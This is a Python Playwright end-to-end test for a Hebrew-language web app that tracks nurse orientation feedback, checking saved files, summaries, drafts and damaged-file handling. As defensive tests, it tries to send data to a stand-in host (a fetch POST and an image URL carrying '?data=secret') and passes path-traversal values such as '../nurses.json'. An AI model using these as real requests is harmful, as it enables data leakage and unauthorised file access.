"""Real-browser test of the web version (dev PC only - needs: pip install playwright && playwright install chromium).

Run: python test_web.py
Serves this folder on http://127.0.0.1 (a secure context, like GitHub Pages), opens the page with ?test-opfs so the
data goes to the browser's private test folder (Playwright cannot click the Windows folder picker), then fills
forms like a nurse and checks the saved files, summaries, corrections, cancels, nurse management, drafts,
damaged files, the offline progress.html and that the page cannot send data anywhere.
Screenshots go to ./test-screenshots/.
"""
import json
import socket
import subprocess
import sys
import tempfile
import time
import urllib.request
from datetime import date, timedelta
from pathlib import Path

from playwright.sync_api import sync_playwright

ROOT = Path(__file__).resolve().parent
SHOTS = ROOT / "test-screenshots"
SKILLS = ["safety", "respiratory", "meds", "time", "communication"]
TODAY = date.today()
d = lambda n: (TODAY - timedelta(days=n)).isoformat()
# (date, shift, week, senior, scores, recommendation, note) - a realistic 3-week improvement
SHIFTS = [
    (d(20), "בוקר", 1, "רינה לוי", [1, 1, 2, 1, 2], "concern", "לא זיהתה ירידה בסטורציה בזמן"),
    (d(18), "ערב", 1, "מיכל אברהם", [2, 1, 2, 2, 2], "continue_reinforce", ""),
    (d(16), "בוקר", 1, "רינה לוי", [2, 2, None, 2, 3], "continue_reinforce", "שיפור בסקשן"),
    (d(13), "לילה", 2, "מיכל אברהם", [2, 2, 3, 2, 3], "continue_reinforce", ""),
    (d(11), "בוקר", 2, "רינה לוי", [3, 2, 3, 3, 3], "continue", ""),
    (d(9), "ערב", 2, "מיכל אברהם", [3, 3, 3, 2, 4], "continue", "תקשורת מצוינת עם משפחות"),
    (d(6), "בוקר", 3, "רינה לוי", [1, 1, 1, 1, 1], "stop", "טעות - ימולא מחדש"),
    (d(6), "בוקר", 3, "רינה לוי", [3, 3, 4, 3, 4], "continue", "עצמאית ברוב המשימות"),  # correction
    (d(2), "בוקר", 3, "מיכל אברהם", [4, 3, 4, 3, 4], "continue", ""),
]

# Helpers that run inside the page against the test folder (same API as a real folder).
JS_READ = """async path => { let d = await navigator.storage.getDirectory(); const p = path.split('/'), n = p.pop();
  for (const x of p) d = await d.getDirectoryHandle(x); return await (await (await d.getFileHandle(n)).getFile()).text(); }"""
JS_LIST = """async path => { let d = await navigator.storage.getDirectory();
  try { for (const x of path.split('/')) d = await d.getDirectoryHandle(x); } catch { return []; }
  const out = []; for await (const [n, h] of d.entries()) if (h.kind === 'file') out.push(n); return out.sort(); }"""
JS_WRITE = """async ([path, bytes]) => { let d = await navigator.storage.getDirectory(); const p = path.split('/'), n = p.pop();
  for (const x of p) d = await d.getDirectoryHandle(x, { create: true });
  const w = await (await d.getFileHandle(n, { create: true })).createWritable(); await w.write(new Uint8Array(bytes)); await w.close(); }"""
# Call a Store function; return [status, value-or-message] instead of throwing.
JS_CALL = """async ([fn, args]) => { try { return [200, await Store[fn](...args)]; }
  catch (e) { return [e.status || 400, e.message]; } }"""


def check(cond, msg):
    print(("  ok   " if cond else "  FAIL ") + msg)
    check.failed += 0 if cond else 1
check.failed = 0


def free_port():
    with socket.socket() as s:
        s.bind(("127.0.0.1", 0))
        return s.getsockname()[1]


def run(url):
    SHOTS.mkdir(exist_ok=True)
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=True)

        print("Privacy: the page cannot send data anywhere (real security policy)")
        strict = browser.new_context()
        sp = strict.new_page()
        sp.goto(url)
        sp.wait_for_selector("#app:not([hidden])")
        blocked = sp.evaluate("""async () => { try { await fetch('https://example.com/x', { method: 'POST', body: 'x' }); return false; }
                                 catch { return true; } }""")
        check(blocked, "fetch to another site is blocked by the page's security policy")
        img = sp.evaluate("""() => new Promise(ok => { const i = new Image(); i.onload = () => ok(false); i.onerror = () => ok(true);
                             i.src = 'https://example.com/x.png?data=secret'; })""")
        check(img, "loading an image from another site (a way to leak data) is blocked")
        strict.close()

        # The test helpers below evaluate code strings, which the page's policy forbids: bypass it for them only.
        ctx = browser.new_context(viewport={"width": 1000, "height": 900}, locale="he-IL", bypass_csp=True)
        page = ctx.new_page()
        errors, pending, dialogs, answer = [], [], [], {"confirm": True}
        page.on("console", lambda m: m.type == "error" and errors.append(m.text))
        page.on("pageerror", lambda e: errors.append(str(e)))

        def on_dialog(dlg):  # prompt: answer from pending; confirm: per test; leave-page: accept
            dialogs.append((dlg.type, dlg.message))
            if dlg.type == "prompt":
                dlg.accept(pending.pop(0)) if pending else dlg.dismiss()
            else:
                dlg.accept() if dlg.type == "beforeunload" or answer["confirm"] else dlg.dismiss()
        page.on("dialog", on_dialog)
        read = lambda path: page.evaluate(JS_READ, path)
        ls = lambda path: page.evaluate(JS_LIST, path)
        call = lambda fn, *args: page.evaluate(JS_CALL, [fn, list(args)])

        page.goto(url)
        page.wait_for_selector("#app:not([hidden])")
        print("Start")
        check(page.is_visible("#testbanner") and page.is_hidden("#connect"), "test mode: app shown, test banner visible")

        print("Form tab")
        def add(kind, name):
            pending.append(name)
            page.click(f'button[data-add="{kind}"]')
            page.wait_for_function(
                f'[...document.querySelectorAll("#form select[data-kind={kind}] option")].some(o => o.text === {json.dumps(name)})')
        add("trainees", "דנה כהן")
        add("seniors", "רינה לוי")
        add("seniors", "מיכל אברהם")
        nurses = json.loads(read("nurses.json"))
        check(len(nurses["trainees"]) == 1 and len(nurses["seniors"]) == 2, "nurses.json written to the folder")
        tid = nurses["trainees"][0]["id"]

        for i, (dt, shift, week, senior, scores, rec, note) in enumerate(SHIFTS):
            page.select_option('#form select[name="trainee_id"]', label="דנה כהן")
            page.select_option('#form select[name="senior_id"]', label=senior)
            page.fill('#form input[name="shift_date"]', dt)
            page.select_option('#form select[name="shift"]', label=shift)
            page.fill('#form input[name="week"]', str(week))
            if i == 0:
                check(page.is_disabled("#save"), "save disabled while form incomplete")
            for k, v in zip(SKILLS, scores):
                page.click(f'label.opt:has(input[name="{k}"][value="{"na" if v is None else v}"])')
            page.click(f'label.opt:has(input[name="recommendation"][value="{rec}"])')
            page.fill('#form textarea[name="note"]', note)
            if i == 0:
                page.screenshot(path=str(SHOTS / "1-form-filled.png"), full_page=True)
            page.click("#save")
            page.wait_for_selector("#msg.ok")
            if i == 7:
                check(any("כבר קיים משוב" in m and senior in m for _, m in dialogs), "same shift again: asks before replacing")
        check(True, f"{len(SHIFTS)} forms saved through the UI")

        print("Files in the data folder")
        raws = ls(f"trainees/{tid}/raw")
        check(len(raws) == len(SHIFTS), f"{len(SHIFTS)} raw files (got {len(raws)})")
        recs = sorted((json.loads(read(f"trainees/{tid}/raw/{r}")) for r in raws), key=lambda r: r["submitted_at"])
        ok = all(r["shift_date"] == dt and r["shift"] == sh and r["week"] == wk and r["senior_name"] == sn
                 and [r["scores"][k] for k in SKILLS] == sc and r["recommendation"] == rc and r["note"] == nt
                 and r["trainee_name"] == "דנה כהן" for r, (dt, sh, wk, sn, sc, rc, nt) in zip(recs, SHIFTS))
        check(ok, "every raw file matches what was clicked")
        check("דנה כהן" in read(f"trainees/{tid}/raw/{raws[0]}"), "Hebrew stored readable")
        summary = json.loads(read(f"trainees/{tid}/processed/summary.json"))
        check(summary["shift_count"] == 8 and summary["superseded_count"] == 1, "summary.json: 8 shifts, 1 corrected")
        check(summary["shifts"][-2]["scores"]["safety"] == 3, "correction (newest) wins")
        check(summary["shifts"][1]["avg"] == 1.8 and summary["shifts"][2]["avg"] == 2.25, "averages, 'not observed' skipped")
        check(summary["skills"]["meds"] == {"first": 2, "latest": 4, "last3_avg": 3.67, "observed": 7}, "per-skill first/latest/last3/observed")

        print("Draft and night date")
        page.click('label.opt:has(input[name="safety"][value="2"])')
        page.fill('#form textarea[name="note"]', "טיוטה")
        page.reload()
        page.wait_for_selector("#app:not([hidden])")
        check(any(t == "beforeunload" for t, _ in dialogs), "leaving with unsaved changes asks first")
        check("טיוטה" in page.inner_text("#msg") and page.is_checked('input[name="safety"][value="2"]')
              and page.input_value('#form textarea[name="note"]') == "טיוטה", "draft restored after refresh")
        tab2 = ctx.new_page(); tab2.goto(url); tab2.wait_for_selector("#app:not([hidden])")
        check(tab2.is_checked('input[name="safety"][value="2"]'), "draft shows in a new tab")
        tab2.close()
        page.click("#clear")
        check(page.evaluate("localStorage.getItem('nurse-tracker-draft')") is None, "clear removes the draft")
        for clock, want in (("2026-10-17T07:00:00", "2026-10-16"), ("2026-10-17T21:30:00", "2026-10-17")):
            cctx = browser.new_context(bypass_csp=True)  # a fake clock applies to a whole context: keep it separate
            pg = cctx.new_page(); pg.clock.install(time=clock); pg.goto(url); pg.wait_for_selector("#app:not([hidden])")
            pg.select_option('#form select[name="shift"]', label="לילה")
            check(pg.input_value('[name="shift_date"]') == want, f"night shift at {clock[11:16]} -> {want}")
            pg.fill('[name="shift_date"]', "2026-10-01"); pg.select_option('#form select[name="shift"]', label="בוקר")
            pg.select_option('#form select[name="shift"]', label="לילה")
            check(pg.input_value('[name="shift_date"]') == "2026-10-01", "hand-picked date not changed")
            cctx.close()

        print("Summary tab")
        page.click('[data-tab="summary"]')
        page.select_option("#pick", label="דנה כהן")
        page.wait_for_selector("#dash svg")
        check(page.locator("#dash table.heat thead th").count() == 9, "grid has 8 shift columns")
        check(page.locator("#dash table.heat td.na").count() == 1, "one 'not observed' cell")
        check("ניהול זמן" in page.locator(".stat", has_text="תחום לחיזוק").inner_text(), "focus area = time management")
        check("NurseTracker" not in page.inner_text("#filepath") and "processed" in page.inner_text("#filepath"), "progress.html path shown")
        page.screenshot(path=str(SHOTS / "2-dashboard.png"), full_page=True)
        page.click('label.opt:has(input[name="decision"][value="extend"])')
        page.select_option('#decide select[name="decider_id"]', label="רינה לוי")
        page.fill('#decide textarea[name="note"]', "שבוע נוסף בלילות")
        page.click("#dsave")
        page.wait_for_selector("#dmsg.ok")
        check("הארכת אוריינטציה" in page.inner_text("#dash") and len(ls(f"trainees/{tid}/decisions")) == 1, "decision saved + shown")

        print("Cancel a form")
        page.click("#dash details summary")
        answer["confirm"] = False
        page.click("#dash [data-void]")
        time.sleep(0.3)
        check(page.locator("#dash table.heat thead th").count() == 9, "declining the question keeps the form")
        answer["confirm"] = True
        page.click("#dash [data-void]")
        page.wait_for_function('document.querySelectorAll("#dash table.heat thead th").length === 8')
        check(len(ls(f"trainees/{tid}/voids")) == 1 and len(ls(f"trainees/{tid}/raw")) == len(SHIFTS), "void record added, raw kept")
        check("1 טפסים בוטלו" in page.inner_text("#dash"), "dashboard shows cancelled count")

        print("Manage nurses")
        page.click('[data-tab="manage"]')
        row = page.locator("#m-seniors tr", has=page.locator('input[value="מיכל אברהם"]'))
        row.locator("input[type=text]").fill("רינה לוי")
        row.locator("button").click()
        page.wait_for_selector("#mmsg.err")
        check("קיים" in page.inner_text("#mmsg"), "duplicate name refused")
        row.locator("input[type=text]").fill("מיכל   אברהם-לוי")
        row.locator("input[type=checkbox]").check()
        row.locator("button").click()
        page.wait_for_selector("#mmsg.ok")
        check(page.locator('#form select[name="senior_id"] option', has_text="מיכל").count() == 0, "inactive senior hidden from form")
        check("מיכל אברהם-לוי" in read(f"trainees/{tid}/processed/progress.html"), "rename rebuilds progress.html (spaces collapsed)")
        check(json.loads(read("nurses.json"))["seniors"][1]["id"] == nurses["seniors"][1]["id"], "id unchanged after rename")

        print("Data layer edge cases")
        st, msg = call("addNurse", "admins", "x")
        check(st == 400, "bad kind refused")
        st, _ = call("saveFeedback", {"trainee_id": "../x", "senior_id": "x"})
        check(st == 400, "unknown / ../ trainee refused")
        sid = nurses["seniors"][0]["id"]
        base = {"trainee_id": tid, "senior_id": sid, "shift_date": d(1), "shift": "ערב", "week": 4,
                "scores": dict.fromkeys(SKILLS, 3), "recommendation": "continue", "note": ""}
        for bad, why in ((dict(shift_date=(TODAY + timedelta(days=1)).isoformat()), "future date"),
                         (dict(shift_date="2026-02-30"), "impossible date"), (dict(shift="צהריים"), "unknown shift"),
                         (dict(week=0), "week 0"), (dict(week="3"), "week as text"), (dict(week=2.5), "week 2.5"),
                         (dict(scores={**base["scores"], "safety": 5}), "score 5"), (dict(scores={"safety": 3}), "missing skills"),
                         (dict(scores={**base["scores"], "extra": 1}), "extra skill"), (dict(scores={**base["scores"], "safety": True}), "score true"),
                         (dict(recommendation="maybe"), "bad recommendation"), (dict(note="x" * 2001), "note > 2000")):
            check(call("saveFeedback", {**base, **bad})[0] == 400, f"refused: {why}")
        st, a = call("saveFeedback", base)
        check(st == 200 and a["file"].endswith(".json"), f"valid form saved {'' if st == 200 else a}")
        check(call("saveFeedback", {**base, "replace": "true"})[0] == 409, "replace:'true' (text) does not skip the question")
        st, b = call("saveFeedback", {**base, "replace": True, "senior_id": nurses["seniors"][1]["id"]})
        check(st == 200, "replace:true saves")
        st, s = call("voidForm", tid, b["file"])
        row = next(x for x in s["shifts"] if x["date"] == d(1))
        check(row["file"] == a["file"], "cancelling the replacement brings back the earlier form")
        check(call("voidForm", tid, "../nurses.json")[0] == 400 and call("voidForm", tid, "nope.json")[0] == 400, "bad cancel targets refused")
        results = page.evaluate("""async ([tid, sid]) => Promise.all([...Array(5)].map(() => Store.saveFeedback({ trainee_id: tid,
            senior_id: sid, shift_date: Store.today(), shift: 'לילה', week: 4, scores: Object.fromEntries(Store.SKILLS.map(k => [k, 2])),
            recommendation: 'continue', note: '' }).then(() => 200, e => e.status)))""", [tid, sid])
        check(sorted(results) == [200, 409, 409, 409, 409], f"5 saves of one shift at once: 1 saved, 4 asked ({sorted(results)})")
        many = page.evaluate("""async ([tid, sid]) => Promise.all([...Array(15)].map((_, i) => { const d = new Date(); d.setDate(d.getDate() - 30 - i);
            return Store.saveFeedback({ trainee_id: tid, senior_id: sid, shift_date: d.toLocaleDateString('sv'), shift: 'בוקר', week: 1,
            scores: Object.fromEntries(Store.SKILLS.map(k => [k, 2])), recommendation: 'continue', note: '' }).then(() => 200, e => e.message); }))""", [tid, sid])
        check(many.count(200) == 15, "15 saves at once all succeed (writes are queued)")

        print("Damaged files")
        for name, data in (("raw/empty.json", b""), ("raw/half.json", b'{"shift_date": "20'), ("raw/list.json", b"[1]"),
                           ("raw/latin1.json", '{"note": "é"}'.encode("latin-1")), ("decisions/bad.json", b'{"decision": "maybe"}'),
                           ("voids/bad.json", b'{"file": 5}')):
            page.evaluate(JS_WRITE, [f"trainees/{tid}/{name}", list(data)])
        st, s = call("summary", tid)
        check(st == 200 and len(s["bad_files"]) == 6, f"summary still works, 6 damaged files listed ({s['bad_files'] if st == 200 else s})")
        check(call("decide", {"trainee_id": tid, "decision": "continue", "decider_id": sid, "note": ""})[0] == 200, "saving still works")
        page.click('[data-tab="summary"]'); page.select_option("#pick", label="דנה כהן")
        page.wait_for_selector("#dash .msg.err")
        check("קובץ פגום" in page.inner_text("#dash"), "red damaged-file warning on dashboard")
        good = read("nurses.json")
        page.evaluate(JS_WRITE, ["nurses.json", list(b"{broken")])
        st, _ = call("addNurse", "seniors", "חדשה")
        check(st == 400 and read("nurses.json") == "{broken", "damaged nurses.json: add refused, file NOT overwritten")
        page.evaluate(JS_WRITE, ["nurses.json", list(good.encode())])

        print("Phone width")
        page.set_viewport_size({"width": 400, "height": 900})
        for tab in ("summary", "manage", "form"):
            page.click(f'[data-tab="{tab}"]')
            check(not page.evaluate("document.documentElement.scrollWidth > innerWidth + 1"), f"no sideways scroll at 400px ({tab})")
        page.click('[data-tab="summary"]')
        page.screenshot(path=str(SHOTS / "3-dashboard-phone.png"), full_page=True)

        print("Standalone progress.html (opens with no internet, no website)")
        html = read(f"trainees/{tid}/processed/progress.html")
        with tempfile.TemporaryDirectory() as tmp:
            f = Path(tmp) / "progress.html"
            f.write_text(html, encoding="utf-8")
            pg = ctx.new_page()
            pg.goto(f.as_uri())
            body = pg.inner_text("body")
            check(pg.locator("table.heat").count() == 1 and "הארכת אוריינטציה" in body and "קובץ פגום" in body
                  and pg.locator("[data-void]").count() == 0, "progress.html renders charts, decision, warning; no cancel buttons")
            pg.screenshot(path=str(SHOTS / "4-progress-file.png"), full_page=True)
            pg.close()

        expected = ("409", "400", "Content Security Policy", "example.com")
        check(not [e for e in errors if not any(x in e for x in expected)], f"no unexpected browser errors {errors}")

        print("First-use screen (no test folder)")
        pg = ctx.new_page()
        pg.goto(url.split("?")[0])
        pg.wait_for_selector("#connect:not([hidden])")
        check(pg.is_hidden("#app") and pg.is_visible("#pickfolder"), "fresh browser: asks to choose the data folder, app hidden")
        pg.screenshot(path=str(SHOTS / "0-connect.png"), full_page=True)
        pg.close()
        browser.close()


if __name__ == "__main__":
    sys.stdout.reconfigure(encoding="utf-8")
    port = free_port()
    srv = subprocess.Popen([sys.executable, "-m", "http.server", str(port), "--bind", "127.0.0.1", "--directory", str(ROOT)],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    try:
        for _ in range(50):
            try:
                urllib.request.urlopen(f"http://127.0.0.1:{port}/index.html", timeout=1); break
            except OSError:
                time.sleep(0.2)
        run(f"http://127.0.0.1:{port}/index.html?test-opfs")
    finally:
        srv.terminate()
        srv.wait()
    print(f"\n{'ALL PASSED' if not check.failed else f'{check.failed} FAILED'} - screenshots in {SHOTS}")
    sys.exit(1 if check.failed else 0)
